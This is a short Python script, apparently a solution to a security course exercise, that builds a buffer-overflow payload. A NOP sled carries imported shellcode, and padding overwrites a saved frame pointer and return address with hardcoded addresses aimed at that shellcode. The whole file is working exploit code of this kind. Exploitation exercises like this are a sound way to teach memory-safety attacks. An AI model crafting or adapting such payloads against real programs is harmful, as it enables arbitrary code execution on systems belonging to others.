#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
dataFieldLen = 40
space = b"\x20"
mainEBP = b"\x88\xb3\xfe\xff"
shellcodeAddr = b"\xf6\xd2\x0d\x08"
aNodeData = b"\x90\x90\x90"+shellcode
bNodeData = (b"\x90"*dataFieldLen) + mainEBP + shellcodeAddr
cNodeData = b"pwn3d"
sys.stdout.buffer.write(aNodeData + space + bNodeData + space + cNodeData)